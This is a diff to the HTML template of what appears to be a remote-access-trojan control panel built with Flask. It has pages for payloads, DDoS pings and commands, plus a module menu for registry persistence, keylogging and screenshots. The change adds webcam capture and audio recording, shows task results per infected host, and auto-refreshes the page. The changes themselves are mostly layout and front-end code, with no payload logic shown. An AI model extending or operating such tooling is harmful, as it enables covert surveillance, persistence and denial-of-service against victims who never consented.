@@ -29,13 +29,12 @@
         }
         .sidebar img.avatar {
             width: 25px;
-            align-content: center;
+            align-items: center;
             margin-bottom: 10px;
             margin-right: 10px;
             vertical-align: middle;
         }
         .sidebar img.logo {
-            align-content: center;
             margin-left: 35px;
             width: 150px;
             margin-bottom: 10px;
@@ -262,7 +261,7 @@
         .sendcommands button:hover {
             background-color: #45a049;
         }
-        @media (max-width: 800px) {
+        @media (max-width: 750px) {
             .container td:nth-child(4),
             .container th:nth-child(4) {
                 display: none;
@@ -274,6 +273,7 @@
     <div class="sidebar">
         <img src="{{ url_for('static', filename='Lion.png') }}" alt="Logo" class="logo">
         <a href="{{ url_for('dashboard') }}"><img src="{{ url_for('static', filename='dashboard_icon.png') }}" alt="Dashboard Icon" class="avatar"> Dashboard</a>
+        <a href="{{ url_for('payload') }}"><img src="{{ url_for('static', filename='payload_icon.png') }}" alt="Payload Icon" class="avatar"> Payload</a>
         <a href="{{ url_for('modules') }}" class="selected"><img src="{{ url_for('static', filename='modules_icon.png') }}" alt="Modules Icon" class="avatar"> Modules</a>
         <a href="{{ url_for('commands') }}"><img src="{{ url_for('static', filename='commands_icon.png') }}" alt="Commands Icon" class="avatar"> Commands</a>
         <a href="{{ url_for('ping') }}"><img src="{{ url_for('static', filename='danger_icon.png') }}" alt="DDOS Ping Icon" class="avatar"> DDOS Ping</a>
@@ -290,6 +290,8 @@
                     <option value="persistence">Create Persistence Key</option>
                     <option value="keylogger">Start Keylogger</option>
                     <option value="screenshot">Capture Screenshot</option>
+                    <option value="picture">Capture Picture</option>
+                    <option value="audio">Record Audio</option>
                 </select>
             </div>
             <button type="submit" id="submit">SEND THE MODULE</button>
@@ -310,27 +312,23 @@
                     <td>{{ task.idNumber }}</td>
                     <td>{{ task.hostname | default('N/A') }}</td>
                     <td>{{ task.command }}</td>
-                    <td>{{ task.status }}</td>
+                    <td>{{ task.result }}</td>
                 </tr>
             {% endfor %}        
         </tbody>
     </table>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/socket.io/4.4.1/socket.io.min.js"></script>
     <script>
         $(document).ready(function() {
-            $("#keylogger").click(function() {
-                $("#command").val("keylogger");
-            });
-            $("#persistence").click(function() {
-                $("#command").val("persistence");
-            });
-            $("#screenshot").click(function() {
-                $("#command").val("screenshot");
-            });
-            $("#submit").click(function() {
-                $("#commandForm").submit();
-            });
+            $("#keylogger").click(function() {      $("#command").val("keylogger");     });
+            $("#persistence").click(function() {    $("#command").val("persistence");   });
+            $("#screenshot").click(function() {     $("#command").val("screenshot");    });
+            $("#picture").click(function() {        $("#command").val("picture");       });
+            $("#audio").click(function() {          $("#command").val("audio");         });
+            $("#submit").click(function() {         $("#commandForm").submit();         });
         });
+        setInterval(function () { window.location.href = window.location.origin + window.location.pathname; }, 8000);
     </script>
 </body>
 </html>
